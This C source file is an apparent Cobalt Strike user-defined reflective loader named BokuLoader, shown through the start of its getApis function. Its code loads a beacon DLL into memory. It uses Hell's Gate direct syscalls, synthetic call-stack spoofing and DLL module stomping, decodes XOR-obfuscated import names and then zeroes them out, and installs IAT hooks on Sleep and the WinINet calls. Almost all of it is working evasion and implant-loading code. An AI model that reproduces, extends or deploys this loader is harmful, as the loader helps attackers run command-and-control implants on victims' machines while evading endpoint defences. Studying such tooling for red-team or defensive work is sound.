#include "BokuLoader.h"

// align stack so we don't end up crashing later with MMX registers
__asm__(
"Setup:\n"              
"    push rsi\n"         // Save rsi to the stack
"    mov  rsi, rsp\n"    // Set rsi to the current stack pointer
"    and  rsp, 0x0FFFFFFFFFFFFFFF0\n"    // Align the stack to a 16-byte boundary
"    sub  rsp, 0x20\n"   // Allocate 32 bytes of space on the stack
"    call BokuLoader\n"
"    mov  rsp, rsi\n"    // Restore the stack pointer
"    pop  rsi\n"         // Restore the original value of rsi
"    pop  rcx \n"        // put ret address in rcx
"    add  rsp, 0x20\n"   // remove 32 bytes of space on the stack
"    and  rsp, 0x0FFFFFFFFFFFFFFF0\n"    // Align the stack to a 16-byte boundary
"    jmp  rcx \n"
);

void * BokuLoader()
{
    SIZE_T size;
    void * base;
    // Dll virtual_beacon, raw_beacon;
    // Spoof_Struct spoof_struct = { 0 }; 

    BYTE xorkey    = 0;
    DWORD oldprotect = 0;
    DWORD newprotect = 0;
    void* hMapFile          = NULL;

    // Get Raw beacons base address
    void * raw_beaconBase = returnRDI();

    HEAP_APIS heap = {0};
    getHeapApis(&heap);

    APIS * api                  = (Dll *)          heap.HeapAlloc(heap.GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(APIS));
    Dll * virtual_beacon        = (Dll *)          heap.HeapAlloc(heap.GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(Dll));
    Dll * raw_beacon            = (Dll *)          heap.HeapAlloc(heap.GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(Dll));
    Spoof_Struct * spoof_struct = (Spoof_Struct *) heap.HeapAlloc(heap.GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(Spoof_Struct));
    Dll * ntdll                 = (Dll *)          heap.HeapAlloc(heap.GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(Dll));

    raw_beacon->dllBase = raw_beaconBase;
    parse_module_headers(raw_beacon);

    setup_synthetic_callstack(spoof_struct);

    ntdll->dllBase = loaded_module_base_from_hash( NTDLL );
    parse_module_headers( ntdll );

    BYTE syscall_gadget_bytes[] = {0x0F,0x05,0xC3};
    void * syscall_gadget = FindGadget((LPBYTE)ntdll->text_section, ntdll->text_section_size, syscall_gadget_bytes, sizeof(syscall_gadget_bytes));

    getApis(api);

    checkUseRWX(raw_beacon);

    virtual_beacon->dllBase = NULL;
    // Check if DLL Module stomping option is enabled from the C2 profile via allocator code 0x4 written by UDRL Aggressor script
    if ((*(WORD *)((BYTE*)raw_beacon->dllBase + 0x40)) == 0x4){
        base = api->LoadLibraryExA(((BYTE*)raw_beacon->dllBase+0x44),0,1);
        // write our .text section at DLL+0x4000 (first 0x1000 is the uncopied header)
        base = ((BYTE*)base + 0x3000);
        oldprotect = 0;
        if(base){
            // Add some extra size 
            size = raw_beacon->size + 0x2000;
            oldprotect = 0;
            // NtProtectVirtualMemory syscall
            HellsGate(getSyscallNumber(api->pNtProtectVirtualMemory));
            ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, raw_beacon->BeaconMemoryProtection, &oldprotect);
            // Have to zero out the memory for the DLL memory to become a private copy, else unwritten memory in beacon DLL can cause a crash.
            RtlSecureZeroMemory(base,size);
            virtual_beacon->dllBase = base;
        }
    }
    else if ((*(WORD *)((BYTE*)raw_beacon->dllBase + 0x40)) == 0x3){
        size = ((BYTE*)raw_beacon->size + 0x10000);
        ULONG_PTR align = 0xFFFFFFFFFFFFF000;
        base = api->HeapAlloc(api->GetProcessHeap(),0x8,size); // 0x8 = zero out heap memory
        base = (void*)((BYTE*)base + 0x2000);
        base = (void*)((ULONG_PTR)base & align);
        if(base){
            oldprotect = 0;
            virtual_beacon->dllBase = base;
            HellsGate(getSyscallNumber(api->pNtProtectVirtualMemory));
            ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, raw_beacon->BeaconMemoryProtection, &oldprotect);
        }
    }
    else if ((*(WORD *)((BYTE*)raw_beacon->dllBase + 0x40)) == 0x2){
        size = raw_beacon->size;

        hMapFile = api->CreateFileMappingA(NtCurrentProcess(),0,PAGE_EXECUTE_READWRITE,0,size,0);
        if(hMapFile){
            base = api->MapViewOfFile(hMapFile,0xF003F,0,0,0);
            if(base){
                oldprotect = 0;
                virtual_beacon->dllBase = base;
                spoof_struct->ssn = getSyscallNumber(api->pNtProtectVirtualMemory);
                base = spoof_synthetic_callstack(
                    NtCurrentProcess(),                     // Argument # 1
                    &base,                                  // Argument # 2
                    &size,                                  // Argument # 3
                    raw_beacon->BeaconMemoryProtection, // Argument # 4
                    spoof_struct,                           // Pointer to Spoof Struct 
                    syscall_gadget,                         // Pointer to API Call
                    (void *)1,                              // Number of Arguments on Stack (Args 5+)
                    &oldprotect                             // Argument ++
                ); 
                // HellsGate(getSyscallNumber(api->pNtProtectVirtualMemory));
                // ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, raw_beacon->BeaconMemoryProtection, &oldprotect);
            }
        }
    }
    else{
        // Allocate new memory to write our new RDLL too
        base = NULL;
        size = raw_beacon->size;
        HellsGate(getSyscallNumber(api->pNtAllocateVirtualMemory));
        ((tNtAlloc)HellDescent)(NtCurrentProcess(), &base, 0, &size, MEM_RESERVE|MEM_COMMIT, raw_beacon->BeaconMemoryProtection);
        RtlSecureZeroMemory(base,size); // Zero out the newly allocated memory

        virtual_beacon->dllBase = base;
    }
 
    checkObfuscate(raw_beacon); 

    doSections(virtual_beacon, raw_beacon);
    doImportTable(api, virtual_beacon, raw_beacon);
    doRelocations(api, virtual_beacon, raw_beacon);
   
    // Get the entry point for beacon located in the .text section
    virtual_beacon->EntryPoint = checkFakeEntryAddress_returnReal(raw_beacon, virtual_beacon);

    // If beacon.text is not RWX, change memory protections of virtual beacon.text section to RX
    if(raw_beacon->BeaconMemoryProtection == PAGE_READWRITE){
        oldprotect = 0;
        base = virtual_beacon->text_section;
        size = virtual_beacon->text_section_size;
        newprotect = PAGE_EXECUTE_READ;
        // NtProtectVirtualMemory syscall
        HellsGate(getSyscallNumber(api->pNtProtectVirtualMemory));
        ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, newprotect, &oldprotect);
    }

    void * EntryPoint = virtual_beacon->EntryPoint;
    void * dllBase    = virtual_beacon->dllBase;

    heap.HeapFree(heap.GetProcessHeap(), 0, api);
    heap.HeapFree(heap.GetProcessHeap(), 0, virtual_beacon);
    heap.HeapFree(heap.GetProcessHeap(), 0, raw_beacon);
    heap.HeapFree(heap.GetProcessHeap(), 0, spoof_struct);

    // Calling the entrypoint of beacon with DLL_PROCESS_ATTACH is required for beacon not to crash. This initializes beacon. After init then beacon will return to us.
    ((DLLMAIN)EntryPoint)(dllBase, DLL_PROCESS_ATTACH, NULL);
    return EntryPoint;
}

void checkObfuscate(Dll * raw_beacon){
    // xor key at beacon.dll+0x24 (OEM Identifier)
    if ((BYTE)raw_beacon->dos_header->e_oemid == 0x1){
        raw_beacon->xor_key = *(BYTE*)((BYTE*)&raw_beacon->dos_header->e_oemid + 0x1);
    }else{
        raw_beacon->xor_key = 0;
    }
}

// OptionalHeader + 0x34 = OptionalHeader.Win32VersionValue. Seems unused by CS so we will put the useRWX flag there
void checkUseRWX(Dll * raw_beacon){
    if (raw_beacon->optional_header->Win32VersionValue == 0xBC){
        raw_beacon->BeaconMemoryProtection = PAGE_EXECUTE_READWRITE;
    }else{
        raw_beacon->BeaconMemoryProtection = PAGE_READWRITE;
    }
}

// if the Malleable PE C2 profile has `set entry_point` then the OPTIONAL_HEADER->EntryPoint is a decoy and the real entry point is at OPTIONAL_HEADER->LoaderFlags
void* checkFakeEntryAddress_returnReal(Dll * raw_beacon, Dll * virtual_beacon){
    if (raw_beacon->optional_header->LoaderFlags == 0){
        return ((BYTE*)virtual_beacon->dllBase + raw_beacon->optional_header->AddressOfEntryPoint);
    }else{
        return ((BYTE*)virtual_beacon->dllBase + raw_beacon->optional_header->LoaderFlags);
    }
}

void doSections(Dll * virtual_beacon, Dll * raw_beacon){
    // Save .text section address and size for destination RDLL so we can make it RE later
    DWORD text_sectionFlag = FALSE;
    DWORD ObfuscateFlag   = FALSE;
    virtual_beacon->text_section = NULL;
    virtual_beacon->text_section_size = 0;
    DWORD numberOfSections = raw_beacon->file_header->NumberOfSections;
    BYTE * this_section   = add(raw_beacon->optional_header, raw_beacon->optional_header_size);
    Section section;
    while( numberOfSections-- )
    {
        __asm__(
            "add rax, 0xC   \n"  // offsetof(IMAGE_SECTION_HEADER, VirtualAddress)
            "xor rcx, rcx   \n"
            "mov ecx, [rax] \n"
            "xchg rax, rcx  \n"
            : "=r" (section.RVA) // RAX OUT
            : "r" (this_section) // RAX IN
        );
        section.dst_rdll_VA = add(virtual_beacon->dllBase, section.RVA);
        __asm__(
            "add rax, 0x14  \n"  // offsetof(IMAGE_SECTION_HEADER, PointerToRawData)
            "xor rcx, rcx   \n"
            "mov ecx, [rax] \n"
            "xchg rax, rcx  \n"
            : "=r" (section.PointerToRawData)  // RAX OUT
            : "r" (this_section) // RAX IN
        );
        section.src_rdll_VA = add(raw_beacon->dllBase, section.PointerToRawData);
        __asm__(
            "add rax, 0x10  \n"  // offsetof(IMAGE_SECTION_HEADER, SizeOfRawData)
            "xor rcx, rcx   \n"
            "mov ecx, [rax] \n"
            "xchg rax, rcx  \n"
            : "=r" (section.SizeOfSection)     // RAX OUT
            : "r" (this_section) // RAX IN
        );
        // check if this is the .text section
        if (text_sectionFlag == FALSE)
        {
            // Save the .text section address & size for later so we can change it from RW to RE. This has to be done after we do relocations
            virtual_beacon->text_section     = section.dst_rdll_VA;
            virtual_beacon->text_section_size = section.SizeOfSection;
            text_sectionFlag = TRUE;
        }
        // Copy the section from the source address to the destination for the size of the section
        memory_copy(section.dst_rdll_VA, section.src_rdll_VA, section.SizeOfSection);
        // Get the address of the next section header and loop until there are no more sections
        this_section += 0x28; // sizeof( IMAGE_SECTION_HEADER ) = 0x28
    }
}

void doImportTable(APIS * api, Dll * virtual_beacon, Dll * raw_beacon){
    void *ImportDirectory, *importEntryHint, *BaseOrdinal, *TableIndex, *nImportDesc;
    void *EntryAddress, *importNameRVA, *LookupTableEntry, *AddressTableEntry, *EntryName, *nullCheck;
    ULONG_PTR len_importName = 0;
    ULONG_PTR len_EntryName  = 0;
    PIMAGE_DOS_HEADER        raw_beacon_DOS_HEADER      = NULL;
    PIMAGE_FILE_HEADER       raw_beacon_FILE_HEADER     = NULL;
    PIMAGE_OPTIONAL_HEADER64 raw_beacon_OPTIONAL_HEADER = NULL;
    PIMAGE_DATA_DIRECTORY    raw_beacon_data_directory  = NULL;
    BYTE * importName = NULL;
    void* slphook     = NULL;
    DWORD    ImportDirectory_RVA  = 0;
    DWORD    ImportDirectory_Size = 0;
    Dll dll_import = {0};
    
    // To enable IAT Hooking change this value to the number of hooks
    // Making this value larger than defined hooks will still work, but it will slow down IAT resolution
    // Enabling the sleephook should have sleepmask set to "false" in C2 profile
    //DWORD hooks = 0;
    DWORD hooks = 13;
     
    // Get the Image base by walking the headers
    raw_beacon_DOS_HEADER       = (PIMAGE_DOS_HEADER)raw_beacon->dllBase;
    raw_beacon_FILE_HEADER      = (PIMAGE_FILE_HEADER)(raw_beacon_DOS_HEADER->e_lfanew + (BYTE*)raw_beacon_DOS_HEADER);
    raw_beacon_OPTIONAL_HEADER  = (PIMAGE_OPTIONAL_HEADER64)(0x18 + (BYTE*)raw_beacon_FILE_HEADER);

    // Get the raw file offset to the Data Directory located in the Optional Header
    raw_beacon_data_directory   = (PIMAGE_DATA_DIRECTORY)raw_beacon_OPTIONAL_HEADER->DataDirectory;

    ImportDirectory_RVA   = raw_beacon_data_directory[1].VirtualAddress;
    ImportDirectory_Size  = raw_beacon_data_directory[1].Size;
    ImportDirectory       = ((BYTE*)virtual_beacon->dllBase + ImportDirectory_RVA);

    nImportDesc = ImportDirectory;
    
    __asm__(
        "xor rcx, rcx   \n"
        "add rdx, 0xC   \n"  // 12 (0xC) byte offset is the address of the Name RVA within the image import descriptor for the DLL we are importing
        "mov ecx, [rdx] \n"  // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->Name into Ecx
        "mov rdx, rcx   \n"
        "add rax, rdx   \n"              // Address of Module String = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name
        : "=r" (importNameRVA),          // RDX OUT
          "=r" (importName)              // RAX OUT
        : "r" (virtual_beacon->dllBase), // RAX IN
          "r" (nImportDesc)              // RDX IN
    );
    // The last entry in the image import directory is all zeros
    while(importNameRVA)
    {
        RtlSecureZeroMemory(&dll_import,sizeof(Dll));
        len_importName  = (ULONG_PTR)StringLengthA(importName);
        if(raw_beacon->xor_key){
            xorc(len_importName, importName, raw_beacon->xor_key);
        }
        dll_import.dllBase   = xLoadLibrary(importName); 
        stomp(len_importName, importName); // 0 out import DLL name in virtual beacon dll
        __asm__(
            "xor rcx, rcx   \n"   // importLookupTableEntry = VA of the OriginalFirstThunk
            "mov ecx, [rax] \n"   // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->OriginalFirstThunk into Ecx
            "add rcx, rdx   \n"   // importLookupTableEntry = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->OriginalFirstThunk
            "xchg rax, rcx  \n"
            : "=r" (LookupTableEntry)        // RAX OUT
            : "r" (nImportDesc),             // RAX IN        
              "r" (virtual_beacon->dllBase)  // RDX IN
        );
        __asm__(
            "xor rcx, rcx   \n"   // importAddressTableEntry = VA of the IAT (via first thunk not origionalfirstthunk)
            "add rax, 0x10  \n"   // 16 (0x10) byte offset is the address of the DWORD FirstThunk within the image import descriptor
            "mov ecx, [rax] \n"   // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->FirstThunk into Ecx
            "add rcx, rdx   \n"   // importAddressTableEntry = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->FirstThunk
            "xchg rax, rcx  \n"
            : "=r" (AddressTableEntry)        // RAX OUT
            : "r" (nImportDesc),              // RAX IN
              "r" (virtual_beacon->dllBase)   // RDX IN
        );
        __asm__(
            "mov rax, [rax] \n"
            : "=r" (nullCheck)        // RAX OUT
            : "r" (AddressTableEntry) // RAX IN
        );
        while(nullCheck)
        {
            parse_module_headers(&dll_import);
            EntryAddress = NULL;

            if( LookupTableEntry && ((PIMAGE_THUNK_DATA)LookupTableEntry)->u1.Ordinal & IMAGE_ORDINAL_FLAG )
            {
                __asm__( // Export Base Ordinal from the Export Directory of the module/dll being imported (0x10 offset)
                    "xor rdx, rdx   \n" // located in the Export Directory in memory of the module which functions/api's are being imported
                    "add rax, 0x10  \n" // DWORD Base; // 0x10 offset // RCX = &importedDllBaseOrdinal
                    "mov edx, [rax] \n" // RAX = importedDllBaseOrdinal (Value/DWORD)
                    "xchg rax, rdx  \n"
                    : "=r" (BaseOrdinal)                // RAX OUT
                    : "r" (dll_import.Export.Directory) // RAX IN
                );
                __asm__( // Import Hint from the modules Hint/Name table
                    "mov rax, [rax]  \n" // RAX = 8000000000000013. 13 is the original Thunk, now we need to get rid of the 8
                    "and eax, 0xFFFF \n" // get rid of the 8
                    : "=r" (importEntryHint) // RAX OUT
                    : "r" (LookupTableEntry) // RAX IN
                );
                __asm__( // Use the import entries Hint and the Imported Modules Base Ordinal from its Export Directory to find the index of our entry/import within the Export Address Table
                    "sub rax, rdx \n" // Import Hint from Hint/Name Table (first 2 bytes before the name string)
                    : "=r" (TableIndex)      // RAX OUT
                    : "r" (importEntryHint), // RAX IN
                      "r" (BaseOrdinal)      // RDX IN
                );
                __asm__( // The ExportAddressTable/AddressOfFunctions holds DWORD (4 byte) RVA's for the executable functions/api's address
                    "mov r11, rdx    \n"
                    "xor r9, r9      \n"
                    "add r9b, 0x4    \n" // sizeof(DWORD) - This is because each entry in the table is a 4 byte DWORD which is the RVA/offset for the actual executable functions address
                    "mul r9          \n" // importEntryExportTableIndex * sizeof(DWORD)
                    "add rax, r11    \n" // RVA for our functions address
                    "xor r10, r10    \n"
                    "mov r10d, [rax] \n" // The RVA for the executable function we are importing
                    "add rcx, r10    \n" // The executable address within the imported DLL for the function we imported
                    "xchg rax, rcx   \n"
                    : "=r" (EntryAddress)                  // RAX OUT
                    : "r"(TableIndex),                     // RAX IN - importEntryExportTableIndex
                      "r"(dll_import.Export.AddressTable), // RDX IN - AddressTable
                      "r" (dll_import.dllBase)             // RCX IN - dllBase
                );
                // patch in the address for this imported function
                __asm__(
                    "mov [rax], rdx \n" // write the address of the imported api to our import table
                    : // no outputs
                    : "r" (AddressTableEntry), // RAX IN = The import table entry we are going to overwrite
                      "r" (EntryAddress)       // RDX IN
                 );
            }
            else
            {
                __asm__( // If there was no ordinal/hint to import then import via the name from the import tables Hint/Name Table for the imported module
                    "mov rax, [rax] \n" // RVA for our functions Name/Hint table entry
                    "add rax, rdx   \n" // VA (Address in memory) Name/Hint Entry = RVA Name/Hint Entry + New RDLL Address
                    "add rax, 0x2   \n" // The hint is the first 2 bytes, then its followed by the name string for our import. We need to drop the first 2 bytes so we just have the name string
                    : "=r" (EntryName)         // RAX OUT
                    : "r" (AddressTableEntry), // RAX IN, import table entry we are going to overwrite / The RVA for our functions Name/Hint Table entry
                      "r" (virtual_beacon->dllBase)   // RDX IN
                );
                // patch in the address for this imported function
                len_EntryName = (ULONG_PTR)StringLengthA(EntryName);
                if(raw_beacon->xor_key){
                    xorc(len_EntryName, EntryName, raw_beacon->xor_key);
                }
                if (hooks){
                    EntryAddress = check_and_write_IAT_Hook(hash_ascii_string(EntryName), virtual_beacon, raw_beacon);
                }
                if (EntryAddress){
                    hooks--;
                }
                if (EntryAddress == NULL){
                    EntryAddress = xGetProcAddress_hash(hash_ascii_string(EntryName), &dll_import);
                }
                stomp(len_EntryName, EntryName); // 0 out import entry name in virtual beacon dll
                __asm__(
                    "mov [rax], rdx \n" // write the address of the imported api to our import table
                    : // no outputs
                    : "r" (AddressTableEntry), // RAX OUT, import table entry we are going to overwrite
                      "r" (EntryAddress)       // RDX IN
                );
            }
            AddressTableEntry += 0x8;
            if(LookupTableEntry)
                LookupTableEntry += 0x8;
            __asm__(
                "mov rax, [rax] \n"
                : "=r" (nullCheck)        // RAX OUT
                : "r" (AddressTableEntry) // RAX IN
            );
        }
        nImportDesc += 0x14; // 0x14 = 20 = sizeof( IMAGE_IMPORT_DESCRIPTOR )
        __asm__( // Do this again for the next module/DLL in the Import Directory
            "xor rcx, rcx   \n"
            "add rax, 0xC   \n"  // 12(0xC) byte offset is the address of the Name RVA within the image import descriptor for the DLL we are importing
            "mov ecx, [rax] \n"  // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->Name
            "mov rax, rcx   \n"  // RVA of Name DLL
            "add rdx, rax   \n"  // Address of Module String = newRdllAddr + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name
            : "=r" (importName),     // RDX OUT
              "=r" (importNameRVA)   // RAX OUT
            : "r" (nImportDesc),     // RAX IN
              "r" (virtual_beacon->dllBase) // RDX IN
        );
    }
}

void* check_and_write_IAT_Hook(DWORD api_hash, Dll * virtual_beacon, Dll * raw_beacon)
{
    // Enabling the sleephook should have sleepmask set to "false" in C2 profile
    if( api_hash == SLEEP)
        return get_virtual_Hook_address(raw_beacon, virtual_beacon, Sleep_Hook);
    // Winet Hooks
    if( api_hash == INTERNETOPENA)
        return get_virtual_Hook_address(raw_beacon, virtual_beacon, InternetOpenA_Hook);
    if( api_hash == INTERNETCONNECTA)
        return get_virtual_Hook_address(raw_beacon, virtual_beacon, InternetConnectA_Hook);
    if( api_hash == HTTPOPENREQUESTA)
        return get_virtual_Hook_address(raw_beacon, virtual_beacon, HttpOpenRequestA_Hook);
    if( api_hash == INTERNETREADFILE)
        return get_virtual_Hook_address(raw_beacon, virtual_beacon, InternetReadFile_Hook);
    if( api_hash == INTERNETQUERYDATAAVAILABLE)
        return get_virtual_Hook_address(raw_beacon, virtual_beacon, InternetQueryDataAvailable_Hook);
    if( api_hash == HTTPSENDREQUESTA)
        return get_virtual_Hook_address(raw_beacon, virtual_beacon, HttpSendRequestA_Hook);
    if( api_hash == INTERNETCLOSEHANDLE)
        return get_virtual_Hook_address(raw_beacon, virtual_beacon, InternetCloseHandle_Hook);
    if( api_hash == INTERNETQUERYOPTIONA)
        return get_virtual_Hook_address(raw_beacon, virtual_beacon, InternetQueryOptionA_Hook);
    if( api_hash == INTERNETSETOPTIONA)
        return get_virtual_Hook_address(raw_beacon, virtual_beacon, InternetSetOptionA_Hook);
    if( api_hash == INTERNETSETSTATUSCALLBACK)
        return get_virtual_Hook_address(raw_beacon, virtual_beacon, InternetSetStatusCallback_Hook);
    if( api_hash == HTTPADDREQUESTHEADERSA)
        return get_virtual_Hook_address(raw_beacon, virtual_beacon, HttpAddRequestHeadersA_Hook);
    if( api_hash == HTTPQUERYINFOA)
        return get_virtual_Hook_address(raw_beacon, virtual_beacon, HttpQueryInfoA_Hook);
    return NULL;
}

void doRelocations(APIS * api, Dll * virtual_beacon, Dll * raw_beacon){
    ULONG_PTR beacon_image_base    = 0;
    ULONG_PTR BaseAddressDelta     = 0;
    PIMAGE_DOS_HEADER        raw_beacon_DOS_HEADER      = NULL;
    PIMAGE_FILE_HEADER       raw_beacon_FILE_HEADER     = NULL;
    PIMAGE_OPTIONAL_HEADER64 raw_beacon_OPTIONAL_HEADER = NULL;
    PIMAGE_DATA_DIRECTORY    raw_beacon_data_directory  = NULL;
    DWORD    BaseRelocationTable_RVA       = 0;
    DWORD    BaseRelocationTable_Size      = 0;
    void*    BaseRelocationTable           = 0;
    PIMAGE_BASE_RELOCATION this_RelocBlock = NULL;
    PIMAGE_BASE_RELOCATION this_BaseRelocation = NULL;
    DWORD this_BaseRelocation_VA = 0;
    DWORD this_BaseRelocation_SizeOfBlock = 0;
    DWORD this_relocation_RVA = 0;
    unsigned short* this_relocation = NULL;
    void* this_relocation_VA = NULL;
    DWORD this_relocBlock_EntriesCount = 0;
     
    // Get the Image base by walking the headers
    raw_beacon_DOS_HEADER       = (PIMAGE_DOS_HEADER)raw_beacon->dllBase;
    raw_beacon_FILE_HEADER      = (PIMAGE_FILE_HEADER)(raw_beacon_DOS_HEADER->e_lfanew + (BYTE*)raw_beacon_DOS_HEADER);
    raw_beacon_OPTIONAL_HEADER  = (PIMAGE_OPTIONAL_HEADER64)(0x18 + (BYTE*)raw_beacon_FILE_HEADER);
    beacon_image_base               = (ULONG_PTR)raw_beacon_OPTIONAL_HEADER->ImageBase;
    // Get the Base Address difference
    BaseAddressDelta                = (ULONG_PTR)((BYTE*)virtual_beacon->dllBase - beacon_image_base);

    // Get the raw file offset to the Data Directory located in the Optional Header
    // The Data Directory has the RVAs and sizes of all the other tables & directories
    raw_beacon_data_directory   = (PIMAGE_DATA_DIRECTORY)raw_beacon_OPTIONAL_HEADER->DataDirectory;

    // Get the RVA and size of the Base Relocation Table from the Data Directory in the raw beacon DLL Optional Header
    BaseRelocationTable_RVA   = raw_beacon_data_directory[5].VirtualAddress;
    BaseRelocationTable_Size  = raw_beacon_data_directory[5].Size;
    
    // Setup the loop to start at the first Base Relocation block in the Base Relocation table
    BaseRelocationTable       = (void*)((BYTE*)virtual_beacon->dllBase + BaseRelocationTable_RVA);
    this_BaseRelocation = (PIMAGE_BASE_RELOCATION)BaseRelocationTable;
    this_BaseRelocation_VA               = this_BaseRelocation->VirtualAddress;
    this_BaseRelocation_SizeOfBlock      = this_BaseRelocation->SizeOfBlock;

    // Loop through and resolve all the block relocation entries in all the block relocations
    // The last block will be all zeros and that's how we know we've reached the end
    while(this_BaseRelocation->VirtualAddress != 0){
        this_relocation                  = (unsigned short*)((BYTE*)this_BaseRelocation + sizeof(IMAGE_BASE_RELOCATION));
        this_relocation_RVA              = this_BaseRelocation->VirtualAddress;
        this_BaseRelocation_SizeOfBlock  = this_BaseRelocation->SizeOfBlock;
        this_relocation_VA               = (void*)((BYTE*)virtual_beacon->dllBase + this_relocation_RVA);
        this_relocBlock_EntriesCount     = (this_BaseRelocation_SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2; 
    
        // Check that its the correct type and then write the relocation
        // Do this for all entries in the Relocation Block
        while( this_relocBlock_EntriesCount-- )
        {
            __asm__(
                "xor r9, r9     \n"
                "mov r9w, [rax] \n"  // 2 byte value for the Relocation Entry (with the 4 bit type and 12 bit offset)
                "mov rax, r9    \n"
                "shr r9, 0x0C   \n"    // Check the 4 bit type
                "cmp r9b, 0x0A  \n"   // IMAGE_REL_BASED_DIR64?
              "jne badtype    \n"
                "shl rax, 0x34  \n"   // only keep the last 12 bits of RAX by shaking the RAX register
                "shr rax, 0x34  \n"   // the last 12 bits is the offset, the first 4 bits is the type
                "add rdx, rax   \n"    // in memory Virtual Address of our current relocation entry
                "mov r10, [rdx] \n"  // value of the relocation entry
                "add r10, rcx   \n"    // value of our relocation entry + the hardcoded Addr:Our Real in memory VA delta we calculated earlier
                "mov [rdx], r10 \n"  // WRITE THAT RELOC!
              "badtype:\n"
                : // no outputs
                : "r" (this_relocation),     // RAX IN
                  "r" (this_relocation_VA),  // RDX IN
                  "r" (BaseAddressDelta)     // RCX IN
            );
            this_relocation = (unsigned short*)((BYTE*)this_relocation + 2);
        }
        // Now move to the next Base Relocation Block and resolve all of the relocation entries
        this_BaseRelocation = ((BYTE*)this_BaseRelocation + this_BaseRelocation->SizeOfBlock);
    }
}

void* get_virtual_Hook_address(Dll * raw_beacon, Dll * virtual_beacon, void* raw_hook_address)
{
    DWORD raw_vs_virtual_delta   = 0;
    void* hook_raw_file_offset          = NULL;
    void* hook_relative_virtual_offset  = NULL;
    void* virtual_hook_address          = NULL;

    raw_vs_virtual_delta         = (DWORD)(raw_beacon->section_header->VirtualAddress - raw_beacon->section_header->PointerToRawData);
    hook_raw_file_offset         = (void*)((BYTE*)raw_hook_address - (BYTE*)raw_beacon->dllBase);
    hook_relative_virtual_offset = (void*)add(hook_raw_file_offset, raw_vs_virtual_delta);
    virtual_hook_address         = (void*)add(hook_relative_virtual_offset, virtual_beacon->dllBase);
    
    return virtual_hook_address;
}

void get_sections(Dll* module) 
{
    BYTE str_text[]  = { '.','t','e','x','t',0     };
    BYTE str_pdata[] = { '.','p','d','a','t','a',0 };

    for (DWORD i = 0; i < module->file_header->NumberOfSections; ++i) {
        if (MemoryCompare((BYTE*)module->section_header[i].Name, str_text, sizeof(str_text)))
        {
            module->text_section = (void*)((BYTE*)module->dllBase + module->section_header[i].VirtualAddress);
            module->text_section_size = (DWORD)module->section_header[i].SizeOfRawData;
        }
        if (MemoryCompare((BYTE*)module->section_header[i].Name, str_pdata, sizeof(str_pdata)))
        {
            module->pdata_section = (void*)((BYTE*)module->dllBase + module->section_header[i].VirtualAddress);
            module->pdata_section_size = (DWORD)module->section_header[i].SizeOfRawData;
        }
    }
}

void parse_module_headers(Dll* module)
{
    module->dos_header            = (PIMAGE_DOS_HEADER)module->dllBase;
    module->file_header           = (IMAGE_FILE_HEADER *)        ( (BYTE *)module->dllBase + module->dos_header->e_lfanew + 4);
    module->optional_header       = (IMAGE_OPTIONAL_HEADER64 *)  ( 0x14 + (BYTE*)module->file_header );
    module->optional_header_size  = (unsigned short)module->file_header->SizeOfOptionalHeader;
    module->section_header        = (IMAGE_SECTION_HEADER *)     ( (BYTE *)module->optional_header  + module->optional_header_size);
    module->export_directory      = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)module->dllBase + module->optional_header->DataDirectory[0].VirtualAddress);

    module->size                  = module->optional_header->SizeOfImage;
    module->SizeOfOptionalHeader  = module->optional_header_size;
    module->NumberOfSections      = module->file_header->NumberOfSections;
    module->EntryPoint            = (void*)((BYTE*)module->dllBase + module->optional_header->AddressOfEntryPoint);

    module->data_directory        = module->optional_header->DataDirectory;
    module->Export.Directory      = (void*)module->export_directory;
    module->Export.DirectorySize  = module->data_directory[0].Size;
    module->Export.AddressTable   = (void*)((BYTE*)module->dllBase + module->export_directory->AddressOfFunctions);
    module->Export.NameTable      = (void*)((BYTE*)module->dllBase + module->export_directory->AddressOfNames);
    module->Export.OrdinalTable   = (void*)((BYTE*)module->dllBase + module->export_directory->AddressOfNameOrdinals);
    module->Export.NumberOfNames  = ((DWORD)module->export_directory->NumberOfNames );

    module->import_directory_size = module->data_directory[1].Size;
    module->import_directory      = ((BYTE*)module->dllBase + module->data_directory[1].VirtualAddress);

    get_sections(module);
}

void getApis(APIS * api){
    Dll k32   = { 0 };
    Dll ntdll = { 0 };
    ntdll.dllBase = loaded_module_base_from_hash( NTDLL    );
    k32.dllBase   = loaded_module_base_from_hash( KERNEL32 );
    parse_module_headers( &ntdll );
    parse_module_headers( &k32   );

    api->pNtAllocateVirtualMemory     = xGetProcAddress_hash( NTALLOCATEVIRTUALMEMORY      , &ntdll  );
    api->pNtProtectVirtualMemory      = xGetProcAddress_hash( NTPROTECTVIRTUALMEMORY       , &ntdll  );
    api->pNtFreeVirtualMemory         = xGetProcAddress_hash( NTFREEVIRTUALMEMORY          , &ntdll  );
    api->LdrLoadDll                   = xGetProcAddress_hash( LDRLOADDLL                   , &ntdll  );
    api->RtlAnsiStringToUnicodeString = xGetProcAddress_hash( RTLANSISTRINGTOUNICODESTRING , &ntdll  );
    api->LdrGetProcedureAddress       = xGetProcAddress_hash( LDRGETPROCEDUREADDRESS       , &ntdll  );
    api->RtlFreeUnicodeString         = xGetProcAddress_hash( RTLFREEUNICODESTRING         , &ntdll  );
    api->RtlInitAnsiString            = xGetProcAddress_hash( RTLINITANSISTRING            , &ntdll  );
    api->NtUnmapViewOfSection         = xGetProcAddress_hash( NTUNMAPVIEWOFSECTION         , &ntdll  );
